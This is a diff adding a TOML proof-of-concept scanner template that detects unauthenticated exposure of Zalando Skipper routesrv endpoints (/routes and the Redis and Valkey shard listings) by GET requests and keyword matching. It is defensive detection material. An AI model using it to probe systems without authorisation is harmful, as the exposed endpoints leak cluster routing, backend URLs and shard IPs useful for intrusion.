@@ -1,0 +1,60 @@
+[info]
+author = "AVE"
+description = "检测 Skipper routesrv 的 /routes 端点是否未授权暴露集群路由拓扑数据。routesrv 默认监听 9090 端口，所有 API 端点缺乏身份认证，攻击者可获取跨命名空间的 Ingress/RouteGroup 配置、后端 URL、过滤器链及缓存集群拓扑信息。"
+id = "POC-AVE-2026-0504"
+name = "Zalando Skipper routesrv 未授权访问 PoC"
+severity = "medium"
+tags = ["ave-2026-0504"]
+vuln_id = [
+    "CVE-2026-54246",
+    "AVE-2026-0504",
+    "GHSA-5587-2x54-jj6h",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/routes"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "eskip",
+    "backend",
+    "route",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/swarm/redis/shards"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "redis",
+    "shard",
+    "ip",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/swarm/valkey/shards"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "valkey",
+    "shard",
+    "ip",
+]
